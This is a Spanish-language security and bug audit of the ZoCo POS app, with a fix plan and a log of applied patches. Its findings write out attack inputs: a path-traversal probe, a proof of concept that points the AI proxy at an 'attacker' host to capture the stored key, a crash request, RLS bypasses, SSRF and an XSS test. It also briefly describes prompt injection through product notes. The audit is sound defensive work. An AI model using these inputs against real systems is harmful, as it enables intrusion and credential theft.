# Auditoría FASE 2 — ZoCo POS

**Fecha:** 25 de noviembre de 2026
**Repo:** `rubenvidal612/ZoCo-POS-App` · **versión auditada:** 2.92.0 (24 nov 2026)
**Nota:** la copia de trabajo no tiene `.git` (se descargó como tarball), así que los números de línea corresponden a esa versión exacta. La FASE 1 (`docs/AUDITORIA-FASE1.md`, commit `229ff84`) está desfasada: la mitad de lo que ahí figuraba como pendiente ya está implementado.

---

## 1. Veredicto en una frase

El **núcleo de venta está sano y funciona** (venta completa verificada en navegador real, sin errores de consola), pero **el corte de caja miente y los permisos de Supabase permiten entrar a la empresa de otro**: son dos fallos que hay que arreglar antes de que el sistema toque dinero o datos de clientes reales.

**46 hallazgos**: 4 críticos, 17 altos, 23 medios y 2 bajos. Los 4 críticos son de RLS/servidor local; los altos se reparten entre caja/stock (5), seguridad (6) y operación (6).

---

## 2. Método

- Lectura de las ~20,800 líneas de `app/js`, `api/`, `tools/serve.mjs` y las 6 migraciones + `setup-all.sql`.
- **Prueba en navegador real**: Chromium headless (Playwright) contra `node tools/serve.mjs` en el puerto 4399, usando `demo.html` (zapatería de ejemplo, `window.__ZOCO_DEMO__`).
- Pruebas de concepto (PoC) sobre el servidor local para los fallos de seguridad; el servidor de pruebas se apagó y se borraron los ficheros que creó.
- No se ejecutó SQL contra un Supabase real: los fallos de RLS se determinaron leyendo las políticas completas y hay que confirmarlos con dos cuentas de prueba.

**Cómo reproducir la prueba de venta:**

```bash
node tools/serve.mjs            # y abrir http://localhost:4321/demo.html
# Vender → Tenis Casual Blanco → talla 23 → color Blanco → carrito ($690)
# → Cobrar → Efectivo → 700 → Cobrar  ⇒ cambio $10 y stock 8 → 7
```

El arnés de navegador usado (Chromium de `/opt/ms-playwright` + `playwright-core`) sirve como base para las pruebas de regresión de P2.1.

---

## 3. Lo que funciona (verificado, no re-auditar)

| Qué | Evidencia |
|---|---|
| Venta completa de punta a punta | Producto → talla 23 → color Blanco → carrito **$690** → efectivo **700** → cambio **$10** → stock `b1["23\|Blanco"]` **8 → 7** |
| Variantes reales por talla+color+sucursal | `branchStock[b1]["23\|Blanco"] = 8`, `["24\|Beige"]`, etc. |
| 0 errores de consola | Carga en escritorio y en móvil (430×900) y flujo de venta completo: 0 `pageerror`, 0 `console.error` |
| Precios y redondeo de cantidades | `salePriceOf`/`addLine` con `round3` y tolerancia; pago dividido suma exactamente el total |
| Inventario operativo | Ajustes (+/−), traspasos, kardex, compras/recepción topada al pendiente |
| QR de tickets | `qr.js` cumple la especificación (tablas EC, BCH, zigzag, máscaras) |
| PWA y sin dependencias | 0 paquetes npm; servicio estático + API mínima en 508 líneas |
| Secretos en Supabase | `company_secrets` con RLS sin políticas y `revoke all`; la llave IA se excluye del estado sincronizado y del respaldo |
| Path traversal | Bloqueado en `serve.mjs:490-491` (probado `/..%2f..%2f..%2fetc%2fpasswd` → 403) |

---

## 4. Hallazgos — dinero y stock

| Sev | Archivo:línea | Defecto | Impacto | Arreglo |
|---|---|---|---|---|
| **Alta** | `store.js:2229` | `cashBreakdown` cuenta el efectivo dos veces: `methods.cash` ya suma la venta y `cashIn` vuelve a sumar el movimiento `in` de `commitSale:1702`; los gastos se restan dos veces (`expenseCash` + movimiento `out` de `:2276`) | El corte Z sale inflado ~2× en efectivo: no cuadra nunca | Excluir por `refType` los movimientos generados por ventas/gastos, o derivar el esperado solo de movimientos |
| **Alta** | `store.js:2194-2199` | `from` solo se usa para filtrar por fecha si se pasa, pero `closeRegisterZ` llama `cashBreakdown({branchId})` sin él, y `openCutZ` tampoco lo pasa | Cada corte arrastra **todo** el historial, no el turno | `from = from \|\| state.register.openedAt` dentro de `cashBreakdown` |
| **Alta** | `store.js:1437-1440` | `returnSale` reembolsa `item.price * qty` ignorando `sale.discount` | Devolución mayor a lo cobrado; `refunded` puede superar el total | Prorratear el descuento y topar `refunded ≤ sale.total` |
| **Alta** | `store.js:1710-1714` | `cancelSale` repone stock de líneas que nunca se descontaron (servicios, `prepararAlVender`, recetas) y se ofrece en ventas ya devueltas | Stock fantasma permanente | Reponer solo lo descontado; bloquear cancelación si `refunded > 0` |
| **Alta** | `store.js:1694-1718` | En pago dividido con `credit_sale` se carga `t.total` completo al cliente; cancelar solo revierte si `method === 'credit_sale'`; `returnSale` no baja el saldo | Cliente sobrecargado y deuda que nunca baja | Sumar solo la parte `credit_sale` y revertirla en cancelar/devolver |
| Media | `store.js:1707-1725` | Cancelar no genera movimiento de caja de salida | El efectivo sale de `methods.cash` pero su `in` sigue contando | `addCash('out', cashPart)` al cancelar |
| Media | `store.js:1540-1542` | `cartTotals` no redondea a centavos | Venta por kg (`0.35 × 189.90 = 66.465`) rechaza el importe mostrado | `round2` en subtotal/descuento/total |
| Media | `views-pos.js:497` | El cupón se acumula en `cart.discount` sin recordar cuál se aplicó | Doble toque aplica el descuento dos veces (hasta total 0) | Guardar `cart.coupon` y recalcular desde cero |
| Media | `views-pos.js:298` | Talla única con colores se agrega sin color → stock 0 | Productos con color invendibles | Llamar `pickColor` cuando `colors.length` |
| Media | `store.js:1806-1827` | Apartado: los abonos entran a caja pero al liquidar no se genera venta, y cancelar no devuelve abonos | Ingresos fuera de ventas/reportes; dinero retenido | Emitir `sale` al liquidar y `refund` al cancelar |
| Media | `store.js:1964-1969` | `cancelPurchase` no restaura `creditApplied` ni lo pagado | Se pierde saldo a favor y dinero | Devolver crédito y reembolso |
| Media | `store.js:1689`, `:714-726` | `Math.max(0, …)` oculta oversell; `consumeRecipe` no valida ingredientes | Se vende sin aviso un kit sin concentrado | Validar como `foodSalePlan` |
| Media | `views-catalog.js:513-518`, `:581-582` | Cambiar sección reconstruye la rejilla en 0 y el guardado reemplaza `branchStock[branch]` | Borra stock de tallas anteriores | Fusionar con el stock previo |
| Media | `store.js:1178-1183`, `:1214` | `emit()` serializa el estado completo a JSON; la cuota solo hace `console.warn`; `hydrate` pisa con `Object.assign` | Con ~5,000 ventas el guardado falla en silencio → pérdida de datos | Ventas en IndexedDB, detectar cuota, merge por registro |
| Baja | `store.js:1594-1606` | Los folios reinician en 1000 por serie | Folios repetidos (riesgo fiscal) | Siguiente folio = máximo usado + 1 |
| Baja | `views-catalog.js:2683-2684` | Abono a cliente sin movimiento de caja | Cobranza fuera del corte | `addCash('in', v)` |

---

## 5. Hallazgos — nube y seguridad

| Sev | Archivo:línea | Fallo | Explotación concreta | Arreglo |
|---|---|---|---|---|
| **Crítica** | `supabase/migrations/20261119000004_invitaciones.sql:50-60` | `members_update` no fija `company_id` ni `role` en el `WITH CHECK` | Un dueño de su propia empresa mueve su fila (o una invitación) a la empresa de la víctima y queda como `owner` | Fijar ambos campos; aceptar la invitación por RPC |
| **Crítica** | `supabase/setup-all.sql:75-76`, `:208-209` | `members_insert` con `check (true)`, y `setup-all.sql` no incluye las migraciones 3-6 | Cualquier usuario autenticado inserta `(auth.uid(), '<empresa>', 'owner')` y entra a otra empresa | Replicar la política de la migración 4 en `setup-all.sql` |
| **Crítica** | `supabase/migrations/20261117000001_init.sql:75-84` | `bootstrap_company` (SECURITY DEFINER, EXECUTE a PUBLIC) acepta cualquier `company_id` y no comprueba si existe | `rpc/bootstrap_company {company_id:"co-…"}` crea membresía de `owner` en una empresa ajena | Rechazar ids existentes; derivar el id del usuario |
| **Crítica** | `tools/serve.mjs:249-289`, `:505` | `/api/state` GET/POST sin auth y bind `0.0.0.0` | Cualquiera en la LAN lee ventas, clientes y PINs, o sobrescribe el estado desde una web | Token de sesión + `Origin`; bind `127.0.0.1` |
| **Alta** | `api/ai.mjs:136-141`, `:170-174`; `serve.mjs:341-346` | `baseUrl` libre con la llave guardada enviada en `Authorization`; acepta cualquier `key`, sin tasa ni origen | `{provider:"custom", baseUrl:"https://attacker"}` devuelve la llave de la empresa (PoC: `Bearer` capturado) | Allowlist de hosts; ignorar `baseUrl` con llave del servidor; rate limit |
| **Alta** | `tools/serve.mjs:5` | `NODE_TLS_REJECT_UNAUTHORIZED='0'` en todo el proceso | Un MITM en el Wi-Fi captura llaves de IA y tickets | Quitar; usar `NODE_EXTRA_CA_CERTS` |
| **Alta** | `tools/serve.mjs:243` | `decodeURIComponent` sin `try/catch` | `GET /%zz` mata el proceso (verificado: exit y health 000) | `try/catch` → 400 |
| **Alta** | `tools/serve.mjs:372-383`, `:403-410` | `/api/print` conecta a host:puerto arbitrarios; `print-raw` escribe bytes arbitrarios | SSRF/escaneo a Redis, SMTP o metadatos internos | Allowlist RFC1918:9100 + auth |
| **Alta** | `app/js/sync.js:66-67` + `store.js:1193` | La llave IA se excluye de Supabase, pero `pushToServer` sube el estado completo a `/api/state` | La llave queda en claro en `data/zoco-*.json` y la sirve `GET /api/state` | Borrar `settings.aiKey` en `pushToServer` |
| **Alta** | `app/js/sync.js:62-72` | Lee `rev` y hace upsert ciego de todo el estado, sin bloqueo optimista | Dos cajas escriben desde `rev 8` y las ventas de una desaparecen | Update condicional por `rev` + merge con reintento |
| Media | `app/js/auth.js:27-32`, `:42-43`; `sync.js:31-43` | JWT en localStorage, `refresh_token` sin usar, fallback silencioso a la anon key | Al caducar, la sync se para sin error y un 401 se lee como nube vacía | Refrescar y comprobar `r.ok` |
| Media | `supabase/migrations/20261117000001_init.sql:59-67` | `state_write` no mira el rol y el blob incluye `users[].pin/pass` | Un cajero lee los PINs y se cambia a OWNER o altera comisiones | Políticas por rol; sacar credenciales del estado |
| Media | `api/tracking.mjs:55` | La clave solo se comprueba si llega `k`; es de 4 dígitos y sin tasa | `?c=X&f=LAV-0001` sin `k` devuelve estado y fechas; se enumeran folios | Exigir `k`, 404 sin `trackCode`, rate limit |
| Media | `api/secret.mjs:96`, `:107-125` | Solo comprueba pertenencia, no rol | Un cajero cambia la llave de IA y desvía prompts (con datos de clientes) a su proveedor | Exigir owner/admin |
| Media | `api/ai.mjs:75`, `:100`, `:149` | `system`, `messages` y `tools` vienen del cliente sin allowlist ni delimitación | Una nota o nombre de producto inyecta instrucciones y fabrica una acción de dinero que el cajero acepta | Delimitar datos y allowlist de tools |

---

## 6. Hallazgos — operación y UI

| Sev | Archivo:línea | Defecto | Impacto en la tienda | Arreglo |
|---|---|---|---|---|
| **Alta** | `importer.js:127-129`, `:376-380` | Reimportar sin columna "cantidad" escribe `0` en "Único"/primera talla (modo reemplazar) | Abarrotes/farmacia pierden todo el stock y quedan "agotados" | No tocar stock si no hay cantidad |
| **Alta** | `importer.js:146`, `:347-363` | Sin SKU el código se genera al azar en cada import; el anti-duplicado solo compara `code` | Cada reimportación duplica productos y suma stock | Clave por SKU o `nombre + sección` |
| **Alta** | `views-food-service.js:159-180` | `closeOrder` cobra `sum(order.items)` ignorando `order.payments` de las partes ya cobradas | Doble cobro al cerrar mesa y caja inflada | Cobrar solo `pendienteDe(order)` |
| **Alta** | `sw.js:3-53`, `:76` | Precarga incompleta (`views-inventory`, `importer`, `xlsx`, `ai-*`) y el fallback devuelve `index.html` para toda URL (`addAll` atómico) | La PWA instalada no arranca sin red; un 404 impide actualizar y deja la versión vieja | Precargar todos los módulos, 503 sin caché, sin `addAll` atómico |
| **Alta** | `views-purchases.js:239`, `:306`; `store.js:1919` | La orden permite "— todas —" y la recepción no pide talla; el stock se suma al primer tamaño | Todo cae en la talla 22/CH: el inventario no cuadra | Exigir variante o desglose por talla |
| **Alta** | `views-purchases.js:63`, `:320`, `:356` | La deuda usa `total - paid` e ignora `creditApplied` (payables sí lo resta) | "Pagar" precarga de más y crea saldo a favor | Restar `po.creditApplied` |
| Media | `importer.js:81-84` | `num()` no entiende miles: `1,290.00 → 0` y `1,290 → 1.29` | Precios de $1,290 se importan en $0 o $1.29 | Parser es-MX |
| Media | `views-inventory.js:425-486` | El kardex recorre todo el historial y pinta todas las filas en el modal; omite compras recibidas e importaciones y mezcla stock de una sucursal con movimientos de todas | Recepciones invisibles, saldo que no reconcilia, UI congelada con años de ventas | Registrar compras/imports, filtrar por sucursal, paginar |
| Media | `views-food-service.js:54-64`, `:763` | Comandas y precuenta usan `window.open + print()`, no `printer.js` | Popup bloqueado = cocina sin comanda; si abre, imprime en otra impresora | Usar `printTicket`/ESC/POS |
| Media | `views-inventory.js:605-621` | "Imprimir corte" solo previsualiza; `cutText` nunca llega a la impresora | El corte Z no se imprime al cerrar turno | `printCut()` ESC/POS |
| Media | `printer.js:36`, `:130` | `plain()` deja pasar `ñ`, pero `TextEncoder` manda UTF-8 sin fijar code page y los acentos se eliminan | "Muñoz" sale "MuÃ±oz", "José" sale "Jose" | Transliterar `ñ→n` o fijar CP850 |
| Media | `printer.js:324-335` | Declara éxito al escribir bytes; no consulta estado (papel, tapa, offline) y el fallback devuelve `ok:true` | Tickets perdidos sin aviso | Consultar DLE EOT/estado y devolver `ok:false` |
| Media | `app.js:363`, `:393` | `${u.name}` se inyecta en `innerHTML` sin escapar | XSS almacenado en el POS compartido: roba sesión y datos | `esc(u.name)` |
| Media | `scanner.js:10-24` | La pistola se ignora con foco en un input; `#pos-q` se autoenfoca sin manejar `Enter` | Escanear al iniciar venta solo filtra el buscador y no agrega el artículo | Manejar `Enter` en el buscador |
| Media | `update.js:52-67` | "Actualizar ahora" borra todas las cachés y recarga sin revisar red ni venta en curso (carrito en memoria) | Un clic en la tarjeta flotante pierde la venta | Bloquear con carrito activo y verificar `onLine` |

**Lo que sí está bien en esta capa:** el service worker es *network-first* (con red nunca sirve JS viejo; el riesgo es offline, no de esquema), los ajustes/mermas firman bien el delta y el kardex los lee, el ESC/POS (init, centrado, doble ancho, avance, corte `GS V B`) es correcto, y nombres de producto/cliente y títulos de modal sí van escapados — el XSS está solo en el nombre de usuario.

---

## 7. Riesgos estructurales

| # | Riesgo | Por qué |
|---|---|---|
| E1 | **Estado monolítico** | Todo el negocio es un JSON que se sube completo. Con 5,000 ventas son varios MB por escritura: egress, latencia y conflictos. Inviable para cadenas. |
| E2 | **Sync sin bloqueo optimista** | `rev` se lee y se escribe a ciegas (`sync.js:62-72`): dos cajas = ventas perdidas, sin aviso. |
| E3 | **Cero pruebas y cero CI** | Los arreglos de hoy se validaron a mano. Cada cambio en `store.js` puede romper caja o stock sin que nadie lo note. |
| E4 | **`setup-all.sql` ≠ migraciones** | El bloque "todo en uno" quedó atrás: no incluye planes, invitaciones ni el modo gratuito. Un proyecto nuevo nace con políticas más débiles que uno migrado. |
| E5 | **Credenciales dentro del estado** | `users[].pin/pass` viaja en el JSON sincronizado: cualquier miembro (o la LAN) los ve. |

---

## 8. Plan priorizado

Esfuerzo: **S** ≤ 3 h · **M** ≤ 1 día · **L** > 1 día. Cada punto incluye el criterio de aceptación.

### P0 — antes de operar con dinero o datos reales (1 día)

| # | Qué | Archivos | Aceptación | Esf. |
|---|---|---|---|---|
| P0.1 ✅ | Arreglar el corte Z: una sola fuente de verdad para el efectivo, ventana del turno obligatoria, gastos/ventas marcados con `refType` | `store.js:2194-2250` | Fondo $500 + venta en efectivo de $690 + gasto de $100 → esperado **$1,090** (hoy da **$1,680**) | S |
| P0.2 ✅ | Cerrar los 3 agujeros de RLS: `members_update` con campos fijos, `members_insert` real en `setup-all.sql`, `bootstrap_company` sin `company_id` libre | migración 4, `setup-all.sql`, `init.sql` | Un usuario B no puede leer ni escribir `company_state` de A (probado con dos cuentas) | S |
| P0.3 | Autenticar `/api/state`, `/api/print*`, `/api/secret` + bind `127.0.0.1` | `tools/serve.mjs` | Sin token → 401; desde otra máquina de la LAN → conexión rechazada | M |
| P0.4 ✅ | Quitar `NODE_TLS_REJECT_UNAUTHORIZED='0'` y proteger `decodeURIComponent` | `serve.mjs:5`, `:243` | `GET /%zz` → 400 (no muere); TLS vuelve a verificarse | S |
| P0.5 ✅ | Allowlist de `baseUrl` en el proxy de IA y rate limit | `api/ai.mjs`, `serve.mjs` | `provider:"custom", baseUrl:"https://attacker"` → 400, la llave no sale | S |

### P1 — corrección del dinero y del inventario (2-3 días)

| # | Qué | Aceptación | Esf. |
|---|---|---|---|
| P1.1 | Devolución prorrateada + tope `refunded ≤ total` | Venta de $690 con 10% de descuento; devolver 1 de 1 pieza reembolsa $621 | S |
| P1.2 | `cancelSale` repone solo lo descontado y se bloquea si hubo devolución | Cancelar una venta con servicio no infla stock; venta devuelta no se puede cancelar | S |
| P1.3 | `credit_sale` en pago dividido: cobrar solo la parte a crédito y revertirla al cancelar/devolver | Saldo del cliente sube/baja exactamente lo financiado | S |
| P1.4 | `round2` en `cartTotals` + cupón idempotente | 0.35 kg × $189.90 cobra $66.47 sin rechazo; doble toque no duplica | S |
| P1.5 | Color obligatorio cuando el producto tiene colores | Producto de talla única con colores se puede vender | S |
| P1.6 | Sync con `rev` condicional y merge por registro | Dos pestañas venden a la vez: ninguna venta se pierde | M |
| P1.7 | Sacar `users[].pin/pass` del estado sincronizado | El blob de Supabase y `/api/state` no contienen credenciales | S |
| P1.8 | Importador: no escribir stock si no hay cantidad; clave anti-duplicado por SKU o `nombre + sección` | Reimportar una lista de precios deja el stock intacto y no duplica productos | S |
| P1.9 | Food: `closeOrder` cobra `pendienteDe(order)` | Cobrar 1 de 2 partes y cerrar mesa registra solo la mitad restante | S |
| P1.10 | Compras: recepción exige variante y la deuda resta `creditApplied` | Recepción con talla correcta; "Pagar" no precarga de más | S |
| P1.11 | Escapar el nombre de usuario (`app.js:363`, `:393`) | Un nombre con `<img onerror>` no ejecuta código | S |

### P2 — robustez (1 semana)

- **P2.1** Pruebas con `node --test`: carrito, descuentos, devoluciones, corte, stock, migraciones (harness con stubs de DOM). **Aceptación:** CI en verde con ≥ 30 casos y los 4 bugs de P0/P1 cubiertos por test de regresión. **M**
- **P2.2** `setup-all.sql` generado desde las migraciones (o eliminar el archivo y documentar el orden). **S**
- **P2.3** Ventas fuera del JSON (IndexedDB o tabla propia) + detección de cuota. **L**
- **P2.4** Reportes con devoluciones, mermas y traspasos; utilidad real. **M**
- **P2.5** Apartados: venta al liquidar y devolución de abonos al cancelar. **M**
- **P2.6** Folios sin reinicio y por sucursal. **S**
- **P2.7** PWA offline: precache completo, `404` → 503 sin caché, `update.js` bloqueado si hay carrito y sin red. **M**
- **P2.8** Impresión: code page/ñ, consulta de estado real y `ok:false`; comandas y corte por ESC/POS en vez de `window.open`. **M**
- **P2.9** Kardex por sucursal, con compras e importaciones, paginado. **M**
- **P2.10** Escáner: `Enter` en `#pos-q` agrega el artículo. **S**

### P3 — producto comercial (2-3 semanas)

- **P3.1** Cobro real (Mercado Pago/Stripe) con webhooks idempotentes: `payment_events.event_id UNIQUE`. **L**
- **P3.2** Ledger de comisiones + `payouts` con conciliación (hoy no existe `payouts` ni `webhook` en el código). **L**
- **P3.3** Roles y permisos finos (cajero no ve PINs ni comisiones). **M**

---

## 9. Pruebas mínimas que deben existir

1. Venta en efectivo con cambio → stock y caja cuadran.
2. Venta con descuento + devolución parcial → reembolso y stock correctos.
3. Pago dividido (efectivo + crédito) → saldo del cliente correcto.
4. Cancelación → stock y caja vuelven al estado previo.
5. Corte Z con fondo, ventas, gastos y devoluciones → esperado exacto.
6. Venta fraccionada (0.35 kg) → total con centavos.
7. Aislamiento entre empresas (RLS) con dos usuarios.
8. Sync concurrente: dos pestañas, ninguna venta perdida.
9. Importación Excel → sin filas perdidas ni duplicadas.
10. `/api/state` sin token → 401.

---

## 10. Qué no se auditó

- `_legacy/` (no está en esta copia) y los `mockups/`.
- El estado real del proyecto Supabase (no se ejecutó SQL): los hallazgos de RLS salen de leer las políticas; conviene confirmarlos con dos cuentas de prueba.
- Pasarela de cobro: no hay código todavía.
- Rendimiento con datos reales (5,000+ ventas): estimado por lectura, no medido.

---

## 11. Cambios aplicados (25 nov 2026) — P0.1 y P0.2

### P0.1 · Corte de caja ✅

- Nuevo módulo **`app/js/cash.js`** (puro, sin DOM) con `cashBreakdownOf()` e `isAutoCashMovement()`. `store.js` delega en él: `cashBreakdown()` y `registerSummary()`.
- Cada movimiento de caja lleva ahora **`origin`** (`sale`, `expense`, `manual`). Los generados por `commitSale` y `payExpense` ya no se suman otra vez; los viejos se reconocen por su nota (`Venta …`, `Gasto: …`).
- El corte **solo mira el turno abierto**: `from` cae a `state.register.openedAt` si no se pasa periodo.
- `payExpense` sella `paidAt` (antes el gasto se filtraba por su fecha de creación y podía caer fuera del turno).
- **Pruebas:** `test/cash.test.mjs`, 10 casos (`npm test`), incluido el caso del corte que antes daba $1,680 y ahora da $1,090.
- **Verificación en navegador:** sobre el estado sembrado del demo, `cashBreakdown().expected` coincidió con el cálculo independiente hecho a mano; la venta de regresión siguió funcionando (stock 8 → 7, cambio $10, 0 errores de consola).

### P0.2 · Seguridad de `members` ✅ (falta correr la checklist en Supabase)

- Nueva migración **`supabase/migrations/20261126000001_members_seguridad.sql`**: trigger `members_guard` (no se cambia `company_id`/`user_id`, y solo un admin cambia rol/correo), políticas `members_insert` / `members_update` / `members_delete` restrictivas y `bootstrap_company` que rechaza empresas ajenas.
- **`supabase/setup-all.sql`** endurecido: el bloque de seguridad va al final del archivo y reemplaza el `members_insert … check (true)` original.
- **`docs/PRUEBA-RLS.md`**: 6 pruebas para el proyecto real (3 de ataque que deben fallar, 3 de operación que deben seguir funcionando).
- La sintaxis de ambos SQL se validó con el parser de PostgreSQL (`libpg_query`): 15 y 72 sentencias, sin errores. **No se ejecutó contra un Postgres real** (no hay servidor en este entorno): esa parte queda pendiente de la checklist.

### Sigue pendiente en P0

- **P0.3** autenticar `/api/state`, `/api/print*`, `/api/secret` y bind a `127.0.0.1`.
- **P0.4** quitar `NODE_TLS_REJECT_UNAUTHORIZED='0'` y proteger `decodeURIComponent`.
- **P0.5** allowlist de `baseUrl` en el proxy de IA + rate limit.

### P0.4 · TLS y caída del servidor ✅

- `tools/serve.mjs` ya **no** desactiva la verificación TLS al arrancar. Si una red con interceptación lo necesita, hay que pedirlo explícitamente con `ZOCO_INSECURE_TLS=1` (avisa por consola); la vía recomendada es `NODE_EXTRA_CA_CERTS=/ruta/ca.pem`.
- `decodeURIComponent` va dentro de `try/catch`: `GET /%zz` responde **400** en vez de matar el proceso (verificado: antes el servidor moría y `/api/health` daba 000).

### P0.5 · Proxy de IA ✅

- Nuevo **`api/ai-hosts.mjs`**: el destino lo decide el proveedor. `gemini/openai/deepseek/anthropic` usan su host fijo e **ignoran `baseUrl`**; `custom` solo acepta `https`, sin credenciales ni puertos raros, y únicamente contra hosts de `ZOCO_AI_ALLOWED_HOSTS`.
- Con la **llave guardada** en el servidor solo se permiten los cuatro proveedores conocidos, así que nadie puede apuntar el proxy a su servidor y quedarse con la llave.
- **Rate limit** en memoria: 30 peticiones/minuto por IP a `/api/ai` → 429.
- Verificado en vivo: `baseUrl` a un host atacante devuelve *"Destino no autorizado"*; con `provider:"openai"` y un `baseUrl` falso la petición sale a `api.openai.com` (error real de OpenAI, no del atacante); a la petición 31 responde 429.
- **Pruebas:** `test/ai-hosts.test.mjs`, 8 casos. Total del proyecto: `npm test` → 18/18.
